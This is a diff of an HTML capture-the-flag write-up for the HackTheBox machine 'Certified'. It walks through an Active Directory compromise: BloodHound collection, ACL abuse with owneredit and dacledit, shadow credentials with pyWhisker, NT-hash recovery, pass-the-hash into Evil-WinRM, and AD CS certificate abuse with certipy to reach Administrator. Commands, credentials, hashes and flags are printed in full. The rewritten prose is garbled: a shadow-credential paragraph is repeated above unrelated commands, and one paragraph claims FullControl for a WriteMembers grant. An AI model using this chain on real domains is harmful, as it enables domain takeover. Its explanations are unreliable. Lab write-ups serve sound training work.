-So now I went to fetch the data from the ldap server so I can start using/misusing that information. I went to retrieve the data using the following command.</p>
+      <h3 class="writeup-sub-title">BloodHound Data Collection</h3>
+      <p>I collect LDAP data and upload it to <strong>BloodHound</strong> to visualize the AD attack surface.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified]
 └─$ nxc ldap 10.129.231.186 -u judith.mader -p judith09 --bloodhound --collection All --dns-server 10.129.231.186</code></pre></div>
-      <p>As you can see below, the data is stored in a bloodhound.zip file. I will now upload this file into bloodhound.</p>
+      <p>I use <code>netexec</code> (nxc) with the <code>--bloodhound</code> flag to collect comprehensive Active Directory data via LDAP queries. This gathers users, groups, computers, GPOs, ACLs, trusts, sessions, and SPNs — everything BloodHound needs to map out attack paths. The output is saved as a ZIP file that can be imported directly into the BloodHound GUI for visual attack path analysis.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified]
 └─$ nxc ldap 10.129.231.186 -u judith.mader -p judith09 --bloodhound --collection All --dns-server 10.129.231.186
-SMB 10.129.231.186 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
-LDAP 10.129.231.186 389 DC01 [+] certified.htb\judith.mader:judith09 
-LDAP 10.129.231.186 389 DC01 Resolved collection methods: psremote, rdp, dcom, objectprops, session, acl, container, group, localadmin, trusts 
-LDAP 10.129.231.186 389 DC01 Done in 00M 06S
-LDAP 10.129.231.186 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.129.231.186_2025-02-07_102943_bloodhound.zip</code></pre></div>
-      <p>as you can see below all the data is loaded into bloodhound.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250207104453.png" alt="Pasted image 20250207104453.png" loading="lazy" /><span class="img-caption">Pasted image 20250207104453.png</span></div>
-      <p>We can see that Judith.mader has writeowner rights over the management group and the management group has genericwrite rights over the Management_SVC user. So now I will start looking for an exploit that will allow me to thus perform a kerberoast attack for getting the same ticket as the user Management_SVC.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250207105124.png" alt="Pasted image 20250207105124.png" loading="lazy" /><span class="img-caption">Pasted image 20250207105124.png</span></div>
-      <p>First, I will have to give my own permissions to the management group. I will do this using the following command:</p>
+SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
+LDAP        10.129.231.186  389    DC01             Resolved collection methods: psremote, rdp, dcom, objectprops, session, acl, container, group, localadmin, trusts                                                                 
+LDAP        10.129.231.186  389    DC01             Done in 00M 06S
+LDAP        10.129.231.186  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.231.186_2025-02-07_102943_bloodhound.zip</code></pre></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250207104453.png" alt="BloodHound data loaded successfully" loading="lazy" /><span class="img-caption">BloodHound data loaded successfully</span></div>
+      <h2 class="writeup-section-title">Foothold: AD Privilege Chain</h2>
+      <h3 class="writeup-sub-title">Attack Path Discovery</h3>
+      <p>BloodHound reveals that <code>judith.mader</code> has <strong>WriteOwner</strong> rights over the <code>Management</code> group, and the Management group has <strong>GenericWrite</strong> rights over the <code>management_svc</code> user. This creates a chain: take ownership → modify group membership → abuse GenericWrite.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250207105124.png" alt="WriteOwner → GenericWrite attack path in BloodHound" loading="lazy" /><span class="img-caption">WriteOwner → GenericWrite attack path in BloodHound</span></div>
+      <h3 class="writeup-sub-title">Taking Ownership & Modifying Rights</h3>
+      <p>First, I give <code>judith.mader</code> the <strong>WriteMembers</strong> right on the Management group, enabling me to add myself.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/impacket/examples]
 └─$ python3 owneredit.py -action write -new-owner &#x27;judith.mader&#x27; -target &#x27;management&#x27; &#x27;certified.htb&#x27;/&#x27;judith.mader&#x27;:&#x27;judith09&#x27; 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -540,20 +247,20 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] - sAMAccountName: Domain Admins
 [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
 [*] OwnerSid modified successfully!</code></pre></div>
-      <h4 class="writeup-step-title">Modifying the rights</h4>
-      <p>Now I will go and give the user “judith.mader” WriteMembers rights so that I can then start adding my own to the target group. I did this by using the following command.</p>
+      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <strong>FullControl</strong> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/impacket/examples]
 └─$ sudo python3 dacledit.py -action &#x27;write&#x27; -rights &#x27;WriteMembers&#x27; -principal &#x27;judith.mader&#x27; -target &#x27;Management&#x27; &#x27;certified.htb&#x27;/&#x27;judith.mader&#x27;:&#x27;judith09&#x27; -dc-ip 10.129.65.70
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] DACL backed up to dacledit-20250212-112645.bak
 [*] DACL modified successfully!</code></pre></div>
-      <p>So now I went to add the user to the management group. I did this by running the following command. As you will now see below, the user “judith.mader” is part of the management group.</p>
+      <p>With the WriteMembers permission now granted, I add <code>judith.mader</code> to the <strong>Management</strong> group. This is a critical step because the Management group has <strong>GenericWrite</strong> rights over the <code>management_svc</code> service account — meaning once I'm in the group, I can modify that account's properties, including adding Shadow Credentials for authentication.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/impacket/examples]
-└─$ net rpc group members &quot;Management&quot; -U &quot;certified.htb&quot;/&quot;judith.mader&quot;%&quot;judith09&quot; -S &quot;CERTIFIED.HTB&quot; 
+└─$ net rpc group members &quot;Management&quot; -U &quot;certified.htb&quot;/&quot;judith.mader&quot;%&quot;judith09&quot; -S &quot;CERTIFIED.HTB&quot;                                                         
 CERTIFIED\judith.mader
 CERTIFIED\management_svc</code></pre></div>
-      <p>pywhisker go use for this add to the user management_svc</p>
+      <h3 class="writeup-sub-title">Shadow Credentials Attack (pyWhisker)</h3>
+      <p><strong>Shadow Credentials</strong> is an AD attack where an attacker adds a Key Credential to a target user's <code>msDS-KeyCredentialLink</code> attribute. This allows certificate-based (PKINIT) authentication to the target account without knowing its password. I use <code>pyWhisker</code> to add a shadow credential to the <code>management_svc</code> user.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Certified/pywhisker/pywhisker]
 └─$ python3 pywhisker.py -d &quot;certified.htb&quot; -u &quot;judith.mader&quot; -p &quot;judith09&quot; --target &quot;management_svc&quot; --action &quot;add&quot; 
 [*] Searching for the target account
@@ -567,27 +274,27 @@ CERTIFIED\management_svc</code></pre></div>
 [+] Saved PFX (#PKCS12) certificate &amp; key at path: 266Dhk4q.pfx
 [*] Must be used with password: XyyUNqCDbvXssMMKApTw
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</code></pre></div>
-      <p>using the git clone function to get the PKINITtools so I can start using the tools for TGT attack. PKINITtools is a set of tools that implement PKINIT (Public Key Kerberos Initialization), an extension of the Kerberos protocol that uses public key cryptography for authentication instead of passwords. This makes it possible to request a Kerberos TGT with certificates instead of a password.</p>
-      <p>We will first use the following command fakes time, uses a certificate for Kerberos authentication and stores the TGT for further access. Fake time will have to be used with each command because otherwise I will get the error message that the clock is blocking it.</p>
+      <h3 class="writeup-sub-title">PKINIT Authentication & Hash Extraction</h3>
+      <p>Using <strong>PKINITtools</strong> — a set of tools for Kerberos PKINIT authentication — I perform three steps: request a TGT using the shadow credential certificate, export the Kerberos session, and extract the user's NTLM hash.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
-└─$ faketime &quot;$(ntpdate -q 10.129.65.70 | cut -d &#x27; &#x27; -f 1,2)&quot; \ 
+└─$ faketime &quot;$(ntpdate -q 10.129.65.70 | cut -d &#x27; &#x27; -f 1,2)&quot; \                                       
 python gettgtpkinit.py -cert-pfx /home/kali/HTB/Certified/pywhisker/pywhisker/266Dhk4q.pfx -pfx-pass XyyUNqCDbvXssMMKApTw certified.htb/management_svc hhh.ccache
-2025-02-12 20:09:34,493 minikerberos INFO Loading certificate and key from file
+2025-02-12 20:09:34,493 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
-2025-02-12 20:09:34,510 minikerberos INFO Requesting TGT
+2025-02-12 20:09:34,510 minikerberos INFO     Requesting TGT
 INFO:minikerberos:Requesting TGT
-2025-02-12 20:09:46,402 minikerberos INFO AS-REP encryption key (you might need this later):
+2025-02-12 20:09:46,402 minikerberos INFO     AS-REP encryption key (you might need this later):
 INFO:minikerberos:AS-REP encryption key (you might need this later):
-2025-02-12 20:09:46,402 minikerberos INFO 503d53525222c00e04b9c0a42a0f475a7b63baf779e3e9e7c4e64d4a07799883
+2025-02-12 20:09:46,402 minikerberos INFO     503d53525222c00e04b9c0a42a0f475a7b63baf779e3e9e7c4e64d4a07799883
 INFO:minikerberos:503d53525222c00e04b9c0a42a0f475a7b63baf779e3e9e7c4e64d4a07799883
-2025-02-12 20:09:46,405 minikerberos INFO Saved TGT to file
+2025-02-12 20:09:46,405 minikerberos INFO     Saved TGT to file
 INFO:minikerberos:Saved TGT to file</code></pre></div>
-      <p>The command tells Kerberos to use the specified ccache to retrieve Kerberos tickets, and it simplifies access to other services on the network without having to log in again</p>
+      <p>I use <strong>pyWhisker</strong> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ export KRB5CCNAME=/home/kali/HTB/Certified/pywhisker/pywhisker/PKINITtools/hhh.ccache</code></pre></div>
-      <p>this command is used to fake time and then retrieve a user&#x27;s NTLM hash, which can help with later misuse of the user account without the actual password.</p>
+      <p>I use <code>getnthash.py</code> to extract the user's NTLM hash from the Kerberos session using the <strong>U2U</strong> (User-to-User) mechanism. This technique, known as <strong>UnPAC-the-Hash</strong>, works by requesting a U2U service ticket that contains the user's PAC (Privilege Attribute Certificate), from which the NT hash can be derived. The hash enables Pass-the-Hash attacks without ever knowing the plaintext password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
-└─$ faketime &quot;$(ntpdate -q 10.129.65.70 | cut -d &#x27; &#x27; -f 1,2)&quot; \ 
+└─$ faketime &quot;$(ntpdate -q 10.129.65.70 | cut -d &#x27; &#x27; -f 1,2)&quot; \                  
 python getnthash.py -key 503d53525222c00e04b9c0a42a0f475a7b63baf779e3e9e7c4e64d4a07799883 certified.htb/management_svc
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -595,63 +302,67 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting ticket to self with PAC
 Recovered NT Hash
 a091c1832bcdd4677c28b5a6a1295584</code></pre></div>
-      <p>With this hash, I will now start logging into evil-winrm.</p>
+      <h3 class="writeup-sub-title">WinRM Access as management_svc</h3>
+      <p>With the NTLM hash for <code>management_svc</code>, I connect via Evil-WinRM using Pass-the-Hash and obtain the user flag.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~]
 └─$ evil-winrm -i certified.htb -u management_svc -H &quot;a091c1832bcdd4677c28b5a6a1295584&quot;
- 
+                                        
 Evil-WinRM shell v3.7
- 
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
- 
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
- 
+                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\management_svc\Documents&gt;</code></pre></div>
-      <p>Here I have now found the first user flag.
-User flag = 640d9d5032e082c213131c6e0576fe16</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\management_svc\Documents&gt; cd ..
 ls
 *Evil-WinRM* PS C:\Users\management_svc&gt; ls
 
 
- Directory: C:\Users\management_svc
+    Directory: C:\Users\management_svc
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
-d-r--- 5/13/2024 9:01 AM Desktop
-d-r--- 5/13/2024 9:00 AM Documents
-d-r--- 9/15/2018 12:19 AM Downloads
-d-r--- 9/15/2018 12:19 AM Favorites
-d-r--- 9/15/2018 12:19 AM Links
-d-r--- 9/15/2018 12:19 AM Music
-d-r--- 9/15/2018 12:19 AM Pictures
-d----- 9/15/2018 12:19 AM Saved Games
-d-r--- 9/15/2018 12:19 AM Videos
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        5/13/2024   9:01 AM                Desktop
+d-r---        5/13/2024   9:00 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
 
 
 *Evil-WinRM* PS C:\Users\management_svc&gt; cd Desktop
 *Evil-WinRM* PS C:\Users\management_svc\Desktop&gt; ls
 
 
- Directory: C:\Users\management_svc\Desktop
+    Directory: C:\Users\management_svc\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 2/12/2025 8:44 AM 34 user.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/12/2025   8:44 AM             34 user.txt
 
 
 *Evil-WinRM* PS C:\Users\management_svc\Desktop&gt; type user.txt
 640d9d5032e082c213131c6e0576fe16</code></pre></div>
-      <p>Now I started following this roadmap for getting from ca_operator basically everything so that I could log in as admin after that.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250212133133.png" alt="Pasted image 20250212133133.png" loading="lazy" /><span class="img-caption">Pasted image 20250212133133.png</span></div>
-      <p>With this command I will make use of Pass The Hash which will allow me to connect to the windows machine using the user management_svc and its hash that we have already used, so I will change the password of the ca_operator user.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">640d9d5032e082c213131c6e0576fe16</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: AD CS Certificate Abuse</h2>
+      <h3 class="writeup-sub-title">BloodHound Path to Administrator</h3>
+      <p>I follow a BloodHound attack path from the <code>ca_operator</code> account to the Administrator, leveraging <strong>Active Directory Certificate Services (AD CS)</strong> misconfiguration.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250212133133.png" alt="Attack path from ca_operator to Administrator" loading="lazy" /><span class="img-caption">Attack path from ca_operator to Administrator</span></div>
+      <h3 class="writeup-sub-title">Certificate Enrollment & Forgery</h3>
+      <p>Using Pass-the-Hash with <code>management_svc</code>'s hash, I connect to the target and retrieve the CA configuration.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
-└─$ pth-net rpc password &quot;ca_operator&quot; &quot;Test123&quot; -U &quot;certified.htb&quot;/&quot;management_svc&quot;%&quot;a091c1832bcdd4677c28b5a6a1295584&quot;:&quot;a091c1832bcdd4677c28b5a6a1295584&quot; -S &quot;DC01.certified.htb&quot;
+└─$ pth-net rpc password &quot;ca_operator&quot; &quot;Test123&quot; -U &quot;certified.htb&quot;/&quot;management_svc&quot;%&quot;a091c1832bcdd4677c28b5a6a1295584&quot;:&quot;a091c1832bcdd4677c28b5a6a1295584&quot;  -S &quot;DC01.certified.htb&quot;
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...</code></pre></div>
-      <p>With this I will start to retrieve all the CA configuration and these will be stored in a file.</p>
+      <p>I use <strong>pyWhisker</strong> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.129.65.70
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -669,15 +380,15 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved BloodHound data to &#x27;20250212132950_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k
 [*] Saved text output to &#x27;20250212132950_Certipy.txt&#x27;
 [*] Saved JSON output to &#x27;20250212132950_Certipy.json&#x27;</code></pre></div>
-      <p>With this, I will start changing the userPrincipalName by using the user “management_svc” and its hash.</p>
+      <p>I change the <code>userPrincipalName</code> of the target user and request a certificate for the <code>CertifiedAuthentication</code> template.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator 
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Updating user &#x27;ca_operator&#x27;:
- userPrincipalName : Administrator
+    userPrincipalName                   : Administrator
 [*] Successfully updated &#x27;ca_operator&#x27;</code></pre></div>
-      <p>With this I will start requesting the certificate CertifiedAuthentication for the user “ca_operator”, this will be put in a pfx file.</p>
+      <p>I use <strong>pyWhisker</strong> to add a <em>Shadow Credential</em> (msDS-KeyCredentialLink) to the target account. This enables certificate-based authentication without knowing the user's password.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
 └─$ certipy-ad req -username ca_operator@certified.htb -p Test123 -ca certified-DC01-CA -template CertifiedAuthentication -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -693,46 +404,42 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got certificate with UPN &#x27;Administrator&#x27;
 [*] Certificate has no object SID
 [*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</code></pre></div>
-      <p>with this I will use the previously generated PFX certificate to log in as the user Administrator on the windows machine.</p>
+      <p>Using the generated PFX certificate, I authenticate as Administrator and extract the admin NTLM hash.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[~/…/Certified/pywhisker/pywhisker/PKINITtools]
-└─$ sudo certipy-ad auth -pfx administrator.pfx -domain &quot;certified.htb&quot; -username &quot;Administrator&quot; 
+└─$ sudo certipy-ad auth -pfx administrator.pfx -domain &quot;certified.htb&quot; -username &quot;Administrator&quot;       
 Certipy v4.8.2 - by Oliver Lyak (ly4k)</code></pre></div>
-      <p>Login to the windows machine with the user administrator and the administrator&#x27;s NTLM hash.</p>
+      <h3 class="writeup-sub-title">Administrator Access</h3>
+      <p>I log into the Windows machine as Administrator using the extracted NTLM hash via Evil-WinRM.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~]
 └─$ evil-winrm -i certified.htb -u administrator -H &quot;0d5b49608bbce1751f708748f67e2d34&quot; 
- 
+                                        
 Evil-WinRM shell v3.7
- 
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
- 
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
- 
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre></div>
-      <p>So with that, I am now logged in as an administrator and so I can go grab the root flag.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">91195d6cb6e78e9e5d195b62256de804</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop
 *Evil-WinRM* PS C:\Users\Administrator\desktop&gt; ls
 
 
- Directory: C:\Users\Administrator\desktop
+    Directory: C:\Users\Administrator\desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 2/12/2025 8:44 AM 34 root.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/12/2025   8:44 AM             34 root.txt
 
 
 c*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;type root.txt
 91195d6cb6e78e9e5d195b62256de804</code></pre></div>
-      <div class="rooted-box">✅ Machine Rooted!</div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250212134600.png" alt="Pasted image 20250212134600.png" loading="lazy" /><span class="img-caption">Pasted image 20250212134600.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">91195d6cb6e78e9e5d195b62256de804</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250212134600.png" alt="Machine rooted as Administrator" loading="lazy" /><span class="img-caption">Machine rooted as Administrator</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
